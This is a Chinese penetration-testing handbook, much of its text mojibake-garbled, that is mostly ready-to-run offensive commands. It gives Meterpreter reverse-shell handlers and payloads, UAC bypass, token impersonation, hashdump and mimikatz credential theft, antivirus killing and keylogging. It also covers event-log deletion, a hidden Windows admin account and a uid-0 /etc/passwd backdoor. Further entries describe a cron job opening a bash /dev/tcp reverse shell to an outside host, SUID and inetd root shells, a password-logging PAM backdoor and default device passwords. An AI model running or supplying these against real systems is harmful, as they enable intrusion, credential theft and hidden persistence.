# Speed-PenTestğŸ•¶
`æ¸—é€æ‰‹å†Œ`
[TOC]

<p align="center">
    <img src="../../img/pentest.jpg">
</p>

`æœ¬äººæ’°å†™çš„æ‰‹å†Œ,ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨,è¯·å‹¿ä½¿ç”¨æ–‡ä¸­çš„æŠ€æœ¯æºç ç”¨äºéæ³•ç”¨é€”,ä»»ä½•äººé€ æˆçš„ä»»ä½•è´Ÿé¢å½±å“,ä¸æœ¬äººæ— å…³ã€‚`

---

# 0ç‘å£«å†›åˆ€/å®‰å…¨å·¥å…·/æ¡†æ¶
## cobaltstrike
**ä½¿ç”¨**
æœåŠ¡ç«¯
`./teamserver ä½ çš„IP ä½ çš„å¯†ç `
å®¢æˆ·ç«¯
`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
æˆ–
`javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**æ–‡ç« **
- [cobalt strike å¿«é€Ÿä¸Šæ‰‹ [ ä¸€ ] - FreeBufä¸“æ Â·æ”»é˜²ä¹‹è·¯](https://www.freebuf.com/column/149236.html)
- [æ•™ä½ ä¿®æ”¹cobalt strikeçš„50050ç«¯å£ - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

**çˆ†ç ´ cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

---

## [Empire](https://github.com/EmpireProject/Empire)
**æ–‡ç« /ç›¸å…³**
- [ã€æŠ€æœ¯åˆ†äº«ã€‘ä¸€ç¯‡æ–‡ç« ç²¾é€šPowerShell Empire 2.3ï¼ˆä¸Šï¼‰](https://www.anquanke.com/post/id/87328)
- [ã€æŠ€æœ¯åˆ†äº«ã€‘ä¸€ç¯‡æ–‡ç« ç²¾é€šPowerShell Empire 2.3ï¼ˆä¸‹ï¼‰](https://www.anquanke.com/post/id/87333)

**å›¾å½¢åŒ–UI**
- [leeberg/BlueCommand](https://github.com/leeberg/BlueCommand)

---

## metasploit
**æ–‡ç« /ç›¸å…³**
- [MSFåŸºç¡€å‘½ä»¤æ–°æ‰‹æŒ‡å—](https://www.jianshu.com/p/77ffbfc3a06c)
- [ã€æ¸—é€ç¥å™¨ç³»åˆ—ã€‘Metasploit](https://thief.one/2017/08/01/1/)
- [ç»™kaliçš„Metasploitä¸‹æ·»åŠ ä¸€ä¸ªæ–°çš„exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)


**Module database cache not built yet, using slow search**
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

**å›¾å½¢åŒ–UI**
- [WayzDev/Kage](https://github.com/WayzDev/Kage)

### meterpreter
**æ–‡ç« **
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploitå…¥é—¨ç”¨æ³•ï¼ˆä¸»åŠ¨æ”»å‡»ï¼‰ - CSDNåšå®¢](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreterå¿…çŸ¥å¿…ä¼šçš„15ä¸ªå‘½ä»¤](https://www.4hou.com/tools/14185.html)
- [èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯•](https://www.anquanke.com/post/id/164525)

**å¿«é€Ÿä¸Šæ‰‹**
```bash
shell   #è·å–ç›®æ ‡ä¸»æœºçš„ cmd shell
getsystem #å‘½ä»¤å¯ä»¥ææƒåˆ°æœ¬åœ°ç³»ç»Ÿæƒé™
sysinfo #æ˜¾ç¤ºç³»ç»Ÿå,æ“ä½œç³»ç»Ÿ,æ¶æ„å’Œè¯­è¨€ç­‰ã€‚
```

- è·å–ä¼šè¯
    **handler**
    ```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter_reverse_tcp
    set LHOST
    set LPORT
    exploit -j  #åå°æ‰§è¡Œ
    ```

    **cmdshell å‡çº§ä¸º meterpreter**
    å¦‚æœæœ€å¼€å§‹è·å–çš„æ˜¯ cmdshell,åæ¥å‘ç°è¿™å°æœºå™¨éå¸¸é€‚åˆä½œä¸ºæµ‹è¯•å…¶å®ƒç»ˆç«¯çš„è·³æ¿,è¿™ä¸ªæ—¶å€™ cmdshell çš„åŠŸèƒ½å·²ç»ä¸èƒ½æ»¡è¶³éœ€è¦,å‡çº§æˆ meterpreter å°±ååˆ†æœ‰å¿…è¦ã€‚
    `sessions -u "id"` å°†è¯¥ cmdshell å‡çº§æˆ meterpreter

- ææƒ
**ç»•è¿‡ UAC**
    é€šå¸¸ webshell çš„æƒé™éƒ½æ¯”è¾ƒä½,èƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œæœ‰é™,æ²¡æ³•æŸ¥çœ‹é‡è¦æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿä¿¡æ¯ã€æŠ“å–ç®¡ç†å‘˜å¯†ç å’Œ hashã€å®‰è£…ç‰¹æ®Šç¨‹åºç­‰,æ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–ç³»ç»Ÿæ›´é«˜çš„æƒé™
    ```bash
    use exploit/windows/local/bypassuac #ä¸€ç³»åˆ—éƒ½å¯ç”¨
    use exploit/windows/local/bypassuac_eventvwr
    sessions    #æŸ¥çœ‹ç›®å‰çš„session
    sessions -k #æ€æ­»æ‰€æœ‰session
    set session    #è®¾ä¸ºä½ éœ€è¦exploitçš„session
    ```

    **åˆ©ç”¨ç³»ç»Ÿæ¼æ´ææƒ**
    ```bash
    use exploit/windows/local/ms13_081_track_popup_menu #ä»¥ms13-081ä¸ºä¾‹
    set session
    ```

- è¿›ç¨‹è¿ç§»
    å½“meterpreterå•ç‹¬ä½œä¸ºä¸€ä¸ªè¿›ç¨‹è¿è¡Œæ—¶å®¹æ˜“è¢«å‘ç°,å¦‚æœå°†å®ƒå’Œç³»ç»Ÿç»å¸¸è¿è¡Œçš„è¿›ç¨‹è¿›è¡Œç»‘å®š,å°±èƒ½å¤Ÿå®ç°æŒä¹…åŒ–ã€‚
    ```bash
    getpid  #æŸ¥çœ‹å½“å‰ä¼šè¯çš„è¿›ç¨‹id
    ps  #æŸ¥çœ‹ç›®æ ‡è¿è¡Œçš„è¿›ç¨‹
    migrate pid #ç»‘å®šè¿›ç¨‹
    ```

- ä»¤ç‰Œå‡å†’
    åœ¨ç”¨æˆ·ç™»å½• windows æ“ä½œç³»ç»Ÿæ—¶,ç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token),å½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯,åŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„ session æˆ–è€… cookieã€‚

    msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œ,å®ç°èº«ä»½åˆ‡æ¢,å¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒ,åˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯,é‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚
    ```bash
    getuid  #æŸ¥çœ‹å½“å‰ç”¨æˆ·
    use incognito   #è¿›å…¥è¯¥æ¨¡å—
    list_tokens -u  #æŸ¥çœ‹å­˜åœ¨çš„ä»¤ç‰Œ
    impersonate_token ç”¨æˆ·å  #ä»¤ç‰Œå‡å†’
    #æ³¨æ„ç”¨æˆ·åçš„æ–œæ éœ€è¦å†™ä¸¤ä¸ªã€‚

    getuid  #æŸ¥çœ‹æ˜¯å¦åˆ‡æ¢æˆåŠŸ
    ```

- è·å–å‡­è¯
    ```bash
    run hashdump

    load mimikatz   #åŠ è½½mimikatzæ¨¡å—
    wdigest
    kerberos
    ```

- æ“ä½œæ–‡ä»¶ç³»ç»Ÿ
    **åŸºæœ¬æ“ä½œ**
    ```bash
    lsï¼šåˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
    pwd æˆ– getwdï¼šæŸ¥çœ‹å½“å‰è·¯å¾„
    searchï¼šæœç´¢æ–‡ä»¶,ä½¿ç”¨search -hæŸ¥çœ‹å¸®åŠ©ã€‚
    catï¼šæŸ¥çœ‹æ–‡ä»¶å†…å®¹,æ¯”å¦‚cat test.txtã€‚
    editï¼šç¼–è¾‘æˆ–è€…åˆ›å»ºæ–‡ä»¶ã€‚å’ŒLinuxç³»ç»Ÿçš„vmå‘½ä»¤ç±»ä¼¼,åŒæ ·é€‚ç”¨äºç›®æ ‡ç³»ç»Ÿæ˜¯windowsçš„æƒ…å†µã€‚
    rmï¼šåˆ é™¤æ–‡ä»¶ã€‚
    cdï¼šåˆ‡æ¢è·¯å¾„ã€‚
    mkdirï¼šåˆ›å»ºæ–‡ä»¶å¤¹ã€‚
    rmdirï¼šåˆ é™¤æ–‡ä»¶å¤¹ã€‚
    getlwd æˆ– lpwdï¼šæŸ¥çœ‹è‡ªå·±ç³»ç»Ÿçš„å½“å‰è·¯å¾„ã€‚
    lcdï¼šåˆ‡æ¢è‡ªå·±å½“å‰ç³»ç»Ÿçš„ç›®å½•ã€‚
    llsï¼šæ˜¾ç¤ºè‡ªå·±å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
    ```

    **ä¸Šä¼ å’Œä¸‹è½½**
    ```bash
    upload <file> <destination> #ä¸Šä¼ æ–‡ä»¶åˆ° Windows ä¸»æœº
    #æ³¨æ„ï¼šä½¿ç”¨ -r å‚æ•°å¯ä»¥é€’å½’ä¸Šä¼ ä¸Šä¼ ç›®å½•å’Œæ–‡ä»¶

    download <file> <path to save>  #ä» windows ä¸»æœºä¸‹è½½æ–‡ä»¶
    #æ³¨æ„ï¼šWindows è·¯å¾„è¦ä½¿ç”¨åŒæ–œçº¿
    #å¦‚æœæˆ‘ä»¬éœ€è¦é€’å½’ä¸‹è½½æ•´ä¸ªç›®å½•åŒ…æ‹¬å­ç›®å½•å’Œæ–‡ä»¶,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ download -rå‘½ä»¤
    ```

- å…¶å®ƒæ“ä½œ
    **å…³é—­é˜²ç—…æ¯’è½¯ä»¶**
    `run killav`
    `run post/windows/manage/killav`

    **æ“ä½œè¿œç¨‹æ¡Œé¢**
    `run post/windows/manage/enable_rdp` å¼€å¯è¿œç¨‹æ¡Œé¢
    `run post/windows/manage/enable_rdp username=test password=test` æ·»åŠ è¿œç¨‹æ¡Œé¢çš„ç”¨æˆ·(åŒæ—¶ä¹Ÿä¼šå°†è¯¥ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„)

    **æˆªå±**
    `screenshot`

    **é”®ç›˜è®°å½•**
    ```bash
    keyscan_startï¼šå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½
    keyscan_dumpï¼šæ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯
    keyscan_stopï¼šåœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½
    ```

    **æ‰§è¡Œç¨‹åº**
    ```bash
    execute -f <path> [options] åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œ exe æ–‡ä»¶
    -Hï¼šåˆ›å»ºä¸€ä¸ªéšè—è¿›ç¨‹
    -aï¼šä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°
    -iï¼šè·Ÿè¿›ç¨‹è¿›è¡Œäº¤äº’
    -mï¼šä»å†…å­˜ä¸­æ‰§è¡Œ
    -tï¼šä½¿ç”¨å½“å‰ä¼ªé€ çš„çº¿ç¨‹ä»¤ç‰Œè¿è¡Œè¿›ç¨‹
    -sï¼šåœ¨ç»™å®šä¼šè¯ä¸­æ‰§è¡Œè¿›ç¨‹
    ```

- ç«¯å£è½¬å‘å’Œå†…ç½‘ä»£ç†
    **portfwd**
    portfwd æ˜¯ meterpreter æä¾›çš„ç«¯å£è½¬å‘åŠŸèƒ½,åœ¨ meterpreter ä¸‹ä½¿ç”¨ portfwd -h å‘½ä»¤æŸ¥çœ‹è¯¥å‘½ä»¤çš„å‚æ•°ã€‚
    ```bash
    portfwd add -l 2222 -r 1.1.1.1 -p 3389 # å°†1.1.1.3çš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„2222ç«¯å£ã€‚
    -lï¼šæœ¬åœ°ç›‘å¬ç«¯å£
    -rï¼šå†…ç½‘ç›®æ ‡çš„ip
    -pï¼šå†…ç½‘ç›®æ ‡çš„ç«¯å£
    ```

    **pivot**
    pivot æ˜¯ msf æœ€å¸¸ç”¨çš„ä»£ç†,å¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨ msf æä¾›çš„æ‰«ææ¨¡å—å¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹ã€‚
    ```bash
    route add å†…ç½‘ip å­ç½‘æ©ç  sessionçš„id # æ·»åŠ ä¸€ä¸ªè·¯ç”±
    route print

    å¦‚æœå…¶å®ƒç¨‹åºéœ€è¦è®¿é—®è¿™ä¸ªå†…ç½‘ç¯å¢ƒ,å°±å¯ä»¥å»ºç«‹socksä»£ç†
    msfæä¾›äº†3ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚
    auxiliary/server/socks4a
    auxiliary/server/socks5
    auxiliary/server/socks_unc

    use auxiliary/server/socks4a
    SRVHOSTï¼šç›‘å¬çš„ipåœ°å€,é»˜è®¤ä¸º0.0.0.0,ä¸€èˆ¬ä¸éœ€è¦æ›´æ”¹ã€‚
    SRVPORTï¼šç›‘å¬çš„ç«¯å£,é»˜è®¤ä¸º1080ã€‚
    ç›´æ¥è¿è¡Œrunå‘½ä»¤,å°±å¯ä»¥æˆåŠŸåˆ›å»ºä¸€ä¸ªsocks4ä»£ç†éš§é“,åœ¨linuxä¸Šå¯ä»¥é…ç½®proxychainsä½¿ç”¨,åœ¨windowså¯ä»¥é…ç½®Proxifierè¿›è¡Œä½¿ç”¨ã€‚
    ```

- åé—¨
    Meterpreterçš„shellè¿è¡Œåœ¨å†…å­˜ä¸­,ç›®æ ‡é‡å¯å°±ä¼šå¤±æ•ˆ,å¦‚æœç®¡ç†å‘˜ç»™ç³»ç»Ÿæ‰“ä¸Šè¡¥ä¸,é‚£ä¹ˆå°±æ²¡åŠæ³•å†æ¬¡ä½¿ç”¨exploitè·å–æƒé™,æ‰€ä»¥éœ€è¦æŒä¹…çš„åé—¨å¯¹ç›®æ ‡è¿›è¡Œæ§åˆ¶
    **metsvc**
    ```bash
    run metsvc
    # å‘½ä»¤è¿è¡ŒæˆåŠŸåä¼šåœ¨ C:WindowsTEMP ç›®å½•ä¸‹æ–°å»ºéšæœºåç§°çš„æ–‡ä»¶å¤¹,é‡Œé¢ç”Ÿæˆ3ä¸ªæ–‡ä»¶(metsvc.dllã€metsvc-server.exeã€metsvc.exe)
    # åŒæ—¶ä¼šæ–°å»ºä¸€ä¸ªæœåŠ¡,æ˜¾ç¤ºåç§°ä¸ºMeterpreter,æœåŠ¡åç§°ä¸ºmetsvc,å¯åŠ¨ç±»å‹ä¸º"è‡ªåŠ¨",ç»‘å®šåœ¨31337ç«¯å£ã€‚

    use exploit/multi/handler
    set payload windows/metsvc_bind_tcp
    set rhost xxx.xxx.xxx.xxx
    set lport 31337
    ```

    **persistence**
    ```bash
    run persistence -X -i 10 -r 192.168.1.9 -p 4444
    -Aï¼šå®‰è£…åé—¨å,è‡ªåŠ¨å¯åŠ¨exploit/multi/handleræ¨¡å—è¿æ¥åé—¨
    -Lï¼šè‡ªå¯åŠ¨è„šæœ¬çš„è·¯å¾„,é»˜è®¤ä¸º%TEMP%
    -Pï¼šéœ€è¦ä½¿ç”¨çš„payload,é»˜è®¤ä¸ºwindows/meterpreter/reverse_tcp
    -Sï¼šä½œä¸ºä¸€ä¸ªæœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼ˆéœ€è¦SYSTEMæƒé™ï¼‰
    -Tï¼šè¦ä½¿ç”¨çš„å¤‡ç”¨å¯æ‰§è¡Œæ¨¡æ¿
    -Uï¼šç”¨æˆ·ç™»é™†æ—¶è¿è¡Œ
    -Xï¼šç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œ
    -iï¼šåé—¨æ¯éš”å¤šå°‘ç§’å°è¯•è¿æ¥æœåŠ¡ç«¯
    -pï¼šæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£
    -rï¼šæœåŠ¡ç«¯ip
    ```

---

## æŠ“åŒ…æ”¹åŒ…
### [Burp Suite](https://portswigger.net/)
**æŠ€å·§**
`Firefox about:config`é‡Œ`network.captive-portal-service.enabled`è®¾ç½®æˆ`false`,å¯ä»¥å…³é—­ç«ç‹å‘`http://detectportal.firefox.com/`å‘åŒ…

**ç”¨æ³•**
- **Intruder**
    çˆ†ç ´æ¨¡å—

- **Target**

- **Positions**

- **Payloads**
    Payload Processing é…ç½®åŠ å¯†è§„åˆ™,ä¼˜å…ˆçº§ç”±ä¸Šå¾€ä¸‹,è‡ªåŠ¨ç»™å­—å…¸ç¼–ç 
    Payload Encoding é…ç½®å­—å…¸è¿›è¡Œ URL ç¼–ç 

- **Options**

- **Extender**
ä¸‹è½½ã€ç®¡ç†burpçš„æ’ä»¶

å¯ä»¥è‡ªè¡Œä¸‹è½½ https://portswigger.net/bappstore
å¤§éƒ¨åˆ†æ’ä»¶è¿è¡Œéœ€è¦[Jython](https://www.jython.org/downloads.html)ã€[JRuby](https://www.jruby.org/download)ç¯å¢ƒ



**ä¹¦**
- [Burp Suite å®æˆ˜æŒ‡å—](https://t0data.gitbooks.io/burpsuite/content/)

---

## exp/poc/toolåˆé›†
- [Kali Linux Tools Listing | Penetration Testing Tools](https://tools.kali.org/tools-listing)
- [ä¿¡æ¯å®‰å…¨å·¥å…·æ±‡æ€» - WLGF,ç½‘ç»œæ”»é˜²å°ç»„](http://www.nsoad.com/Security-tools/20180730/tools-1217.html)
- [rootphantomer/exp: æ”¶é›†å„ç§å„æ ·çš„exp](https://github.com/rootphantomer/exp)
- [Jack-Liang/kalitools: Kali Linuxå·¥å…·æ¸…å•](https://github.com/Jack-Liang/kalitools)
- [k8gege/K8tools: K8å·¥å…·åˆé›†](https://github.com/k8gege/K8tools)
- [WangYihang/Exploit-Framework](https://github.com/WangYihang/Exploit-Framework)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [csirt/CVEsPoCs](https://github.com/Spacial/csirt/blob/master/CVEsPoCs.md)
- [wudimahua/Firewall](https://github.com/wudimahua/Firewall)
- [nanshihui/PocCollect](https://github.com/nanshihui/PocCollect)
- [hanc00l/some_pocsuite](https://github.com/hanc00l/some_pocsuite)
- [foospidy/web-cve-tests](https://github.com/foospidy/web-cve-tests)
- [cckuailong/PocCollect](https://github.com/cckuailong/PocCollect)
- [ptresearch/AttackDetection](https://github.com/ptresearch/AttackDetection)
- [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)

---

# 1Crypto
## å„ç§çˆ†ç ´
### æœåŠ¡-ç«¯å£çˆ†ç ´
- [galkan/crowbar](https://github.com/galkan/crowbar) - æ”¯æŒå¯¹äºOpenVPNã€RDPã€SSHã€VNCçš„çˆ†ç ´ï¼Œéå¸¸ä¼˜ç§€çš„å·¥å…·


### æ–‡ä»¶çˆ†ç ´

---

## å­—å…¸å·¥å…·
### å­—å…¸ç”Ÿæˆ
- [LandGrey/pydictor](https://github.com/LandGrey/pydictor)
- [crunch](https://sourceforge.net/projects/crunch-wordlist/)
- [RicterZ/genpAss](https://github.com/RicterZ/genpAss)

---

### å„ç±»å­—å…¸
**é»˜è®¤è®¾å¤‡/æœåŠ¡å£ä»¤**
- è®¾å¤‡
    å¾ˆå¤šå‚å•†è®¾å¤‡å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æ‰¾åˆ° https://default-password.info/
    ```bash
    ç¾¤æ™–
    admin  123456

    é”æ·
    ruijie  ruijie

    é”æ·ap
    admin/ruijie  apdebug

    FUJI XEROXæ‰“å°æœº
    11111 x-admin

    RICOHæ‰“å°æœº
    supervisor å¯†ç ä¸ºç©º
    ```

- æœåŠ¡
    ```bash
    zabbix
    admin zabbix
    ```

**å­—å…¸ä¸‹è½½**
- [weakpass](https://weakpass.com/)
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- https://downloads.skullsecurity.org/passwords/
- [rootphantomer/Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)
- [H4lo/dictionary](https://github.com/H4lo/dictionary)

---

# 2Misc
## æƒé™ç»´æŒ/åä¾¦å¯Ÿ
### é€šç”¨
**msfvenom**
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe`

**Veil**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh â€“c
sudo ./Veil.py
```

**HERCULES**
```bash
ç¡®ä¿ç”µè„‘é‡Œæœ‰Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

**ASWCrypter**
**VENOM**
**Metasploit**
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost
set lport
run
```

---

### web
#### åé—¨
é¸½

---

### win
#### åé—¨
```bash
net user PHPNET$ 1234abcd~ /add # æ·»åŠ ç”¨æˆ·
# Windows çš„å¸å·åç§°åå¸¦ç€"$"ç¬¦å·æ—¶,ä¸ä¼šåœ¨ net user å‘½ä»¤ä¸­æ˜¾ç¤ºå‡ºå¸å·ä¿¡æ¯
net localgroup administrators PHPNET$ /add # å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„
net user PHPNET$ /del # åˆ é™¤ç”¨æˆ·

query user # æŸ¥çœ‹ä¼šè¯

logoff IDå· # è¸¢æ‰
```

#### ç—•è¿¹æ¸…ç†
**åˆ é™¤æ—¥å¿—æ–‡ä»¶**
```bash
net stop eventlog   #åœæ­¢æœåŠ¡
del c:\Windows\System32\Winevt\Logs\* /Q
```

### linux
#### åé—¨
**æ·»åŠ rootæƒé™åé—¨ç”¨æˆ·**
æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡ï¼Œä¸€ä¸ªå¸¦æœ‰å¯†æ–‡ä¸”idä¸º0çš„è´¦å·ã€‚
å¯†ç åŠ å¯†ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤`perl -e 'print crypt("password", "AA"). "\n"'`
æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæƒ³è¦åœ¨passwdæ–‡ä»¶ä¸­çš„æ¡ç›®æ˜¯è¿™ä¸ªæ ·å­çš„`backdoor:AA6tQYSfGxd/A/A:0:0:me:/root:/bin/bash`
æ‰§è¡Œå†™å…¥`echo "backdoor:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash">>/etc/passwd`

**Crondå¼€æœºè‡ªå¯åé—¨**
å…ˆåˆ›å»º /etc/xxxx è„šæœ¬æ–‡ä»¶ï¼ˆåå­—è‡ªå·±æ”¹ï¼‰ï¼Œåˆ©ç”¨è¯¥è„šæœ¬è¿›è¡Œåå¼¹ã€‚ä»¥ä¸‹è„šæœ¬ä»£è¡¨å…¨è‡ªåŠ¨åå¼¹åˆ° 8.8.8.8 çš„ 53 ç«¯å£ã€‚
```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi

chmod +sx /etc/xxxx
```
```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx

service cron reload #ä¸åŒå‘è¡Œç‰ˆé‡å¯æ–¹å¼ä¸ä¸€æ ·
service cron start
```

ç„¶ååœ¨ 8.8.8.8 çš„æœåŠ¡å™¨ä¸Šä½¿ç”¨ NC æ¥æ”¶ Shell å³å¯ã€‚
`nc -vv -lp 53`

**SUID shell**
é¦–å…ˆ, å…ˆåˆ‡æ¢æˆä¸ºrootç”¨æˆ·ï¼Œå¹¶æ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤:
```bash
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al /.woot
-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```
å½“ç„¶, ä½ ä¹Ÿå¯ä»¥èµ·å…¶ä»–æ›´å…·å¤‡éšè—æ€§çš„åå­—,æˆ‘æƒ³çŒ¥çå¹¶æœºæ™ºçš„ä½ ï¼Œè‚¯å®šèƒ½æƒ³å‡ºå¾ˆå¤šå¥½çš„åå­—çš„ã€‚
æ–‡ä»¶å‰é¢çš„é‚£ä¸€ç‚¹ä¹Ÿä¸æ˜¯å¿…è¦çš„ï¼Œåªæ˜¯ä¸ºäº†éšè—æ–‡ä»¶( åœ¨æ–‡ä»¶åçš„æœ€å‰é¢åŠ ä¸Šâ€œ.â€ï¼Œå°±å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ç›®å½•ä¸‹è¿›è¡Œéšè—) .
```bash
#ç°åœ¨ï¼Œåšä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæˆ‘ä»¬æ¥å¯ç”¨è¿™ä¸ªåé—¨:
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw)
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
#ä¸ºä»€ä¹ˆä¸è¡Œå‘¢? å› ä¸º bash2 é’ˆå¯¹ suidæœ‰ä¸€äº›æŠ¤å«çš„æªæ–½. ä½†è¿™ä¹Ÿä¸æ˜¯ä¸å¯ç ´çš„:
```
```bash
/.woot -p
id
    uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
#ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shell. è¿™ä¸ªeuidçš„æ„æ€æ˜¯ effective user id
#è¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œä½œä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚
```
å¦‚ä½•æŸ¥æ‰¾é‚£äº›å…·æœ‰SUID çš„æ–‡ä»¶:
`dawg:~# find / -perm +4000 -ls`
è¿™æ—¶å°±ä¼šè¿”å›å…·æœ‰SUIDä½çš„æ–‡ä»¶å•¦ã€‚

**è¿œç¨‹åé—¨**
```vim
vim /etc/inetd.conf
    #discard stream tcp nowait root internal
    #discard dgram udp wait root internal
    daytime stream tcp nowait root /bin/bash bash -i

inetd
ç„¶åå°±å¯ä»¥ç”¨ncæ¥çˆ†èŠ
```
å¯ä»¥ä¿®æ”¹/etc/servicesæ–‡ä»¶ï¼ŒåŠ å…¥ä»¥ä¸‹çš„ä¸œè¥¿
```vim
vim /etc/services
    woot 6666/tcp #evil backdoor service
vim /etc/inetd.conf
    woot stream tcp nowait root /bin/bash bash -i
```

**PAMåé—¨**
ä¸»è¦æ€è·¯:pam_unix_auth.cæ‰“è¡¥ä¸å®‰è£…åˆ°æ­£å¸¸çš„PAMæ¨¡å—ä¸­ã€‚
1ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼š
`rpm -qa |grep pam`
2ã€ç¼–è¯‘å®‰è£…PAM
3ã€å°†æœ¬åœ°pam_unix_auth.cæ–‡ä»¶é€šè¿‡æ‰“è¡¥ä¸æ–¹å¼ï¼Œç¼–è¯‘ç”Ÿæˆã€‚
4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules/pam_unix/.libs/pam_unix.soï¼Œåé—¨å¯†ç ä¸ºroot123,å¹¶ä¼šåœ¨/tmp/pslogè®°å½•rootç™»å½•å¯†ç ã€‚

**vimåé—¨**
